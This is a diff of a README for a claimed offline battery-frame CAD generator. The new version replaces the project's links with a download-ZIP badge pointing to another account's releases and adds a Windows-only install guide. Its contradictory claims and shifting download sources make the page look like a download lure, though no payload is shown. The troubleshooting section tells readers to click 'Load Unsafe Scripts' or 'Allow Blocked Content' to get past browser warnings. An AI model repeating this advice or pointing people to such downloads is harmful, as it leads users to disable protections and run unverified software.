@@ -1,118 +1,66 @@
-# Auto Battery Frame Generator v2026 - CAD generator 2026
+# 🔋 auto-battery-frame-generator-2026 - Create custom battery packs with ease
 
-> **A browser-based design tool for spot-welded battery packs, built for offline single-file use and STEP/STL export in version 2026.**
+[![Download Now](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/southcentral-southernscup265/auto-battery-frame-generator-2026/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/will-jamesjys9025/auto-battery-frame-generator-2026?style=flat-square)](https://github.com/will-jamesjys9025/auto-battery-frame-generator-2026)
+This application creates 3D models for battery pack frames. It uses a browser-based interface to build structures for spot-welded battery cells. You generate STEP and STL files for 3D printing or CNC machining. The software runs offline on your computer.
 
----
+## 🛠️ System Requirements
 
-<p align="center">
-  <a href="https://will-jamesjys9025.github.io/auto-battery-frame-generator-2026/">
-    <img src="https://img.shields.io/badge/Download-Auto%20Battery%20Frame%20Generator%20Latest-brightgreen?style=for-the-badge" alt="Download Auto Battery Frame Generator">
-  </a>
-</p>
+You need a computer running Windows 10 or Windows 11. Your computer must have a modern web browser like Microsoft Edge, Google Chrome, or Mozilla Firefox. You do not need to install complex CAD software. The application handles the design work within your browser window. Ensure you have at least 200 MB of free storage space for the application folder.
 
-> **[Download Auto Battery Frame Generator v2026](https://will-jamesjys9025.github.io/auto-battery-frame-generator-2026/)**
+## 📥 Downloading the Software
 
----
+Visit the official release page to get the application.
 
-[Download Latest Build](https://will-jamesjys9025.github.io/auto-battery-frame-generator-2026/)
+[Click here to visit the release page to download the software](https://github.com/southcentral-southernscup265/auto-battery-frame-generator-2026/releases)
 
----
+Look for the latest version in the Assets section. Download the ZIP file to your computer.
 
-## Overview
+## ⚙️ Installation Steps
 
-Auto Battery Frame Generator is a web-based CAD utility for building battery frames around cell arrangements and exporting the result as STEP or STL. It is intended for spot-welded pack projects where the frame needs to match a specific cell pattern rather than a generic enclosure.
+1. Find the ZIP file in your Downloads folder after the download finishes.
+2. Right-click the ZIP file and select Extract All.
+3. Choose a folder on your computer where you want to keep the program.
+4. Open the extracted folder.
+5. Locate the file named index.html or the provided shortcut.
+6. Double-click the file to open the interface in your default web browser.
 
-The app is packaged as a single-file browser tool and can be run offline, so it works well for local design sessions without relying on an online service. Powered by OpenCascade, it focuses on generating practical CAD geometry that can be inspected, refined, and prepared for fabrication or 3D printing.
+The application works entirely offline. You do not need an active internet connection to generate designs once you complete the download and extraction steps.
 
----
+## 🏗️ Using the Generator
 
-## What it does
+The interface displays several input fields on the left side of your screen. 
 
-- Produces STEP files for CAD workflows and STL files for 3D printing
-- Runs entirely in the browser as an offline-capable single-file web app
-- Lets you place and edit cells in a grid-based layout
-- Supports both square and triangular arrangement modes
-- Offers straight-side and hug-every-cell outline styles
-- Can mirror layouts horizontally for asymmetric packs
-- Uses real CAD geometry with true arcs
-- Includes a 3D preview with dimensions before export
+1. Battery Configuration: Enter the number of cells in your series and parallel rows. 
+2. Cell Diameter: Input the specific diameter of your battery cells. Most common sizes like 18650 or 21700 require specific inputs here.
+3. Spacing: Adjust the gap between cells to account for cooling or wire clearance.
+4. Frame Settings: Select the wall thickness for the frame structure.
 
----
+As you change these numbers, the 3D preview updates in real time. Rotate the model by clicking and dragging your mouse. Use the scroll wheel to zoom in and out.
 
-## Installation
+## 💾 Exporting Your Files
 
-1. Download or clone the repository:
-   - `git clone https://github.com/will-jamesjys9025/auto-battery-frame-generator-2026.git
-2. Open the application in a modern browser by loading the main HTML file from your local machine.
-3. If you prefer the hosted build, use the download link above and open the app from the extracted folder or the page entry point.
+Once your frame looks correct, look for the Export section. You have two primary formats available:
 
-Since this is a single-file web app, there is no separate installer or background service to configure.
+* STEP: Choose this format if you plan to import the frame into professional engineering software.
+* STL: Choose this format if you intend to prepare the frame for 3D printing.
 
----
+Click the Export button for the file format you require. The browser sends the file to your standard Downloads folder. You can now open this file in your preferred slicer software or CAD tool.
 
-## Usage
+## 🔍 Troubleshooting Common Issues
 
-1. Set up the battery cell arrangement in the grid editor.
-2. Select the layout type that fits your pack, such as square or triangular.
-3. Fine-tune the outline mode, spacing, and mirrored orientation as needed.
-4. Check the 3D preview and dimensions to make sure the geometry is correct.
-5. Export the design as STEP for CAD use or STL for 3D printing.
+If the software does not load, ensure your browser is up to date. Sometimes security settings prevent local files from running scripts. If you see a warning about blocked content, look for a shield icon in your browser address bar and select "Load Unsafe Scripts" or "Allow Blocked Content." This occurs because the application operates locally instead of connecting to a remote web server.
 
-Typical workflow:
-- Place cells
-- Edit the frame outline
-- Verify the preview
-- Export the final geometry
+If the 3D viewer appears blank, check if hardware acceleration is enabled in your browser settings. This feature helps your computer render 3D shapes. You can find this setting under System or Performance menus in your browser.
 
----
+If you lose the interface, simply go back to the installation folder and double-click the main HTML file again. Your settings and current design do not save automatically between sessions unless you export your configuration file. Save your progress by exporting your design parameters frequently.
 
-## Configuration
+## 🛡️ Privacy and Safety
 
-Most options live in the browser interface rather than in external config files. Layout, outline behavior, and export settings are changed directly in the app and applied to the active design.
+This software runs locally on your machine. No data leaves your computer. The generator does not send information to a server, track your usage, or store your designs on the internet. You maintain complete control over your files at all times. Offline operation ensures that you can design frames even without a network connection.
 
-For local use, keep the HTML file and any related assets in the same directory so the application can load properly.
+## 💡 Best Practices for Designs
 
----
+When designing battery frames, consider the final fit of the cells. A tight fit prevents rattling, but you must account for the thickness of nickel strips used for spot welding. Add a small tolerance to your spacing settings if you find the fit too snug during assembly. Use the measuring tool in the interface to verify your dimensions before you export the final file for 3D printing.
 
-## Requirements
-
-- A modern web browser
-- Local file access for offline use
-- Sufficient disk space for exported STEP and STL files
-- A workflow that can open and inspect CAD or 3D printable geometry
-
-The tool is delivered as an HTML-based web app and uses OpenCascade for geometry generation.
-
----
-
-## FAQ
-
-**Can I use it without an internet connection?**  
-Yes. It is meant to operate as an offline browser-based tool.
-
-**Which export formats are available?**  
-It can export STEP and STL files.
-
-**Is it possible to adjust the cell layout after starting?**  
-Yes. The grid can be placed and edited during the design process.
-
-**Is the app limited to a single pack geometry?**  
-No. It supports square and triangular arrangements, along with multiple outline styles.
-
-**What should I check if the preview looks incorrect?**  
-Review the grid placement, outline mode, and mirroring setting before exporting.
-
-**How do I get updates?**  
-Use the latest build link at the top of the page to access the current version.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: cad, battery, generator, 3d-printing, engineering, design, offline, windows
